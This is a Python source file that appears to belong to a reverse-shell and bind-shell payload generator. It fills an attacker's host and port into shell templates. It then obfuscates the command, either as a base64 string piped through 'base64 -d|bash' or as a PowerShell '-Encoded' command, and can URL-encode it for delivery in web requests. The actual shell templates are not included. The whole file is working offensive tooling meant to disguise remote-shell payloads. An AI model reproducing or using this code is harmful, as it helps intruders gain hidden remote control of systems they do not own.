from encoders import powershell_base64
import platform
import urllib

def base64_wrapper(name, code, args):
    if args.base64 is True:
        if "powershell" not in name.lower():
            code = "echo " + code.encode("base64").replace("\n", "") + "|base64 -d|bash"
        else:
            # Powershell encoding code
            prefix, xcode = code.split("-Command")
            pcode = xcode.replace("'", "") # Remove single quotes from -Command
            pcode = pcode.replace("\\", "") # remove string quotation
            code = prefix + "-Encoded " + powershell_base64(pcode)
    return code

class ReverseShell(object):
    def __init__(self, name, args, code):
        self.name = name
        self.args = args
        self.host = args.host
        self.port = args.port
        self.code = code

    def get(self):
        """
        Generate the code.
        Apply encoding, in the correct order, of course.
        """
        self.code = str(self.code.replace("TARGET", self.host)).replace("PORT", str(self.port))
        
        # Apply the base64 encoding.
        self.code = base64_wrapper(self.name, self.code, self.args)

        # Apply URL-encoding
        if self.args.urlencode is True:
            self.code = urllib.quote(self.code)
        
        return self.code

class BindShell(object):
    def __init__(self, name, args, code):
        self.name = name
        self.args = args
        self.port = args.port
        self.code = code

    def get(self):
        """
        Generate the code.
        Apply encoding, in the correct order, of course.
        """
        self.code = self.code.replace("PORT", str(self.port))

        # Apply base64 encoding.
        self.code = base64_wrapper(self.name, self.code, self.args)

        # Apply url-encoding
        if self.args.urlencode is True:
            self.code = urllib.quote(self.code)
        
        return self.code

class OperationalSystem(object):
    def __init__(self):
        self.OS = "linux" if "linux" in platform.platform().lower() else "windows"
